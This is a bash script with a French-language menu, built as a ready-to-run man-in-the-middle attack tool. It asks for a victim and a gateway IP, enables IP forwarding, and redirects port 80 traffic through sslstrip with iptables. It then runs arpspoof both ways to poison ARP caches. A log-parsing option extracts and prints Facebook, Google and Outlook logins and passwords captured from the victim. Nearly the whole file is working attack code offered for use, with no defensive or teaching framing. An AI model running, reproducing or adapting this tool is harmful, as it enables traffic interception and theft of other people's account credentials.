#!/bin/bash -x
clear
sortie="0"
#set -eux
iptables -t nat -F
while [ $sortie -eq "0" ]
	do
		clear
		ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')
		ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
		echo "Statut des différents modules:"
		echo " "
		if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ] 
			then 
				echo "#-----------------------#"
				echo "|\033[0;31mPas d'attaque en cours\033[0m |"
				echo "|arpspoof: \033[0;31mNOK.\033[0m         | $ctrl_arpspoof"
				echo "|sslstrip: \033[0;31mNOK.\033[0m         | $ctrl_sslstrip" 
				echo "#-----------------------#"
			elif  [ -z $ctrl_sslstrip ]
					then
						echo "#-----------------------#"
						echo "|\033[0;31mPas d'attaque en cours\033[0m |" 
						echo "|arpspoof: \033[0;32mOK.\033[0m          | $ctrl_arpspoof"    
						echo "|sslstrip: \033[0;31mNOK.\033[0m	        | $ctrl_sslstrip"
						echo "#-----------------------#"
						
										
			elif [ -z $ctrl_arpspoof ]
					then
						echo "#-----------------------#"
						echo "|\033[0;31mPas d'attaque en cours\033[0m  |"
						echo "|arpspoof: \033[0;31mNOK.\033[0m          | $ctrl_arpspoof"                                         
						echo "|sslstrip: \033[0;32mOK.\033[0m          | $ctrl_sslstrip"
						echo "#-----------------------#"
			else
				echo "#-----------------------#"
				echo "|\033[0;32mAttaque en cours\033[0m      |"
				echo "|arpspoof: \033[0;32mOK.\033[0m         | $ctrl_arpspoof"
				echo "|sslstrip: \033[0;32mOK.\033[0m         | $ctrl_sslstrip"
				 echo "#-----------------------#"
		fi                
		echo " "
		echo " "
		echo "===========================MENU==========================="
		echo "1. Lancer l'attaque MITM"
		echo "2. Arrêter les process en cours"
		echo "3. Fermer le programme"
		echo "4. Check du fichier sslstrip.log (outlook-google-facebook) "
                echo "Choisissez l'action que vous souhaitez faire (1-4)"
		read choix
		case $choix in
			"1")
				ctrl_sslstrip=$(ps aux | grep -i "sslstrip " | head -n 1 | grep -vi "grep" |awk '{print $2}')
				ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi "grep" |awk '{print $2}')
				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ] # si arpspoof et sslstrip ne sont pas lancés alors..
					then
			        		clear
						echo "Entrez l'adresse ip de la victime:"
						read vict
						echo " "
						echo "Entrez l'adresse ip de la passerelle"
						read passerelle
						echo " " 
						echo "Entrez le port d'écoute de sslstrip"
						read port
						echo " "
						echo "Quel interface souhaitez vous utiliser?:"
						ifconfig | cut -d " " -f 1 | sed '/^$/d' 
						read iface
						echo 1 > /proc/sys/net/ipv4/ip_forward &
						##mise en place de l'écoute en local
						sslstrip -w sslstrip.log -a -l $port -f 2> /dev/null &
						iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port &
						##empoisonnement de cache ARP
						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
						clear
						echo "\033[0;32mL'attaque est en cours\033[0m"
						sleep 2
					else
						clear
						echo "\033[0;31mL'attaque est déjà lancée\033[0m"
						sleep 2
				fi
					;;
			"2")
				clear
				ctrl_sslstrip=$(ps aux | grep -i "sslstrip -w" | head -n 1 | grep -vi grep |awk '{print $2}')
				ctrl_arpspoof=$(ps aux | grep -i "arpspoof" | head -n 1 | grep -vi grep |awk '{print $2}')
				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ]
					then
						clear
						echo "\033[0;31mLes process ne sont pas lancées\033[0m"
						sleep 2
					elif [ -z $ctrl_sslstrip ]
						then 
							clear
							killall arpspoof
							iptables -t nat -F
							echo "arpspoof: arrêt en cours, veuillez patienter"
					 		echo "10s"
					 		sleep 2
				 			echo "8s"
					 		sleep 2
					 		echo "6s"
					 		sleep 2
					 		echo "4s"
					 		sleep 2
				 			echo "2s"
					 		sleep 2
					 		clear
					 		echo "\033[0;32mAttaque Stoppée\033[0m"
					 		sleep 2
						
					elif [ -z $ctrl_arpspoof ]
						then
							clear
					 		killall sslstrip
					 		iptables -t nat -F
					 		echo "sslstrip: arrêt en cours, veuillez patienter"
					 		echo "10s"
					 		sleep 2
					 		echo "8s"
					 		sleep 2
					 		echo "6s"
					 		sleep 2
					 		echo "4s"
					 		sleep 2
					 		echo "2s"
					 		sleep 2
					 		clear
					 		echo "\033[0;32mAttaque Stoppée\033[0m"
					 		sleep 2
					else
						clear
						killall arpspoof
						killall sslstrip
						iptables -t nat -F
						echo " arpspoof & ssltrip: arrêt en cours, veuillez patienter"
						echo "10s"
						sleep 2   
						echo "8s" 
						sleep 2   
						echo "6s"
						sleep 2  
	                                        echo "4s"
	                                        sleep 2  
	                                        echo "2s"
		                                sleep 2  
		                                clear    
		                                echo "\033[0;32mAttaque Stoppée\033[0m"
		                                sleep 2
		                                                                                                                                                                                                                                                                                                
				
				fi
				;;
			"3")
				clear
				if [ -z $ctrl_sslstrip ] && [ -z $ctrl_arpspoof ]
					then
						#kill $ctrl_sslstrip
						#kill $ctrl_arpspoof
						killall sslstrip
						killall arpspoof
						iptables -t nat -F
					elif  [ -z $ctrl_sslstrip ]
						then
							kill $ctrl_arpspoof
							iptables -t nat -F
					elif [ -z $ctrl_arpspoof ]
						then	
							kill $ctrl_sslstrip
							iptables -t nat -F
					else
					iptables -t nat -F
				fi
				echo "Le programme est en cours d'arrêt"
				sortie="1"                              
				;;                                                                  
			"4")
				clear
				check=`ls -s`
				rep_loc=`pwd`
				boucle="1"
				echo "Choisissez le fichier sslstrip.log (répertoir courant: $rep_loc)"
				read chemin
				
#---------------------------------------Verifie que le fichier existe-------------------------------
				if [ -f $chemin ]
					then	
						clear
						echo "\033[0;32mFichier ok.\033[0m"
						echo "----------"
					else
						while [ $boucle != "0"  ]
							do
#								clear
								echo "$boucle"
								echo "le fichier spécifié n'existe pas"
								echo "Saisissez le chemin du fichier:"
								read chemin
								if [ -f $chemin ]
									then
										echo "le fichier existe"
										boucle="0"
										echo "$boucle"
									else
										echo "le fichier n'existe pas"
										boucle="1"
								fi
							done
				fi
#-------------------------------------Test sur le fichier termine-------------------------------------

#-------------------------------------Verification des information de comptes-------------------------

					#facebook total: facebook_login=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*email=\([^&]*\).*pass=\([^&]*\).*/login=\1 pass=\2/')

					facebook_login=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*email=\([^&]*\).*/\1/') #recup du login
					facebook_pass=$(grep "email=" $chemin| grep "&pass=" | sed 's/.*pass=\([^&]*\).*/\1/')

					if [ -z $facebook_login ] || [ -z $facebook_pass ] # On vérifie que que le login et le mot de passe ne sont pas vide
						then
							checkfb=1
						else
							checkfb=0
						fi


					gmail_login=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Email=\([^&]*\).*/\1/')
					gmail_pass=$(grep "Email=" $chemin | grep "&Passwd=" | sed 's/.*Passwd=\([^&]*\).*/\1/')

					if [ -z $gmail_login ] || [ -z $gmail_pass ]
						then
        						checkgm=1
						else
               						 checkgm=0
						fi

#outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^&]*\).*/\1/'| sed 's/\%40/\@/g')
					outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
					outlook_pass=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')

					if [ -z $outlook_login ] || [ -z $outlook_pass ]
					        then
					                checkou=1
						else
							checkou=0
					fi
                                                
#--------------------------------------------AFFICHAGE----------------------------------------------                                                                                

					if [ $checkfb -eq 0 ]
						then
							echo "Des informations de connexions FACEBOOK ont été trouvées!"
							echo " "
							echo " \033[0;32mLogin:\033[0m $facebook_login"
							echo " \033[0;32mPassword:\033[0m $facebook_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe FACEBOOK trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"	
							echo " "
						fi

					if [ $checkgm -eq 0 ]
						then
							echo "Des informations de connexions GOOGLE ont été trouvées"
							echo " \033[0;32mLogin:\033[0m $gmail_login  \033[0;32mPassword:\033[0m $gmail_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe GOOGLE trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"
							echo " "
					fi
	
					if [ $checkou -eq 0 ]
						then
							echo "Des informations de connexions OUTLOOK ont été trouvées"
							echo "\033[0;32mLogin:\033[0m $outlook_login"
							echo " "
							echo "\033[0;32mPassword:\033[0m $outlook_pass"
							echo "--------------------------------------------------------------------------------"
							echo " "
						else
							echo "\033[0;31m Pas de mots de passe OUTLOOK trouvé\033[0m"
							echo "--------------------------------------------------------------------------------"
							echo " "
					fi
					sleep 10
				;;

		esac
done                                                                                                                                                                       
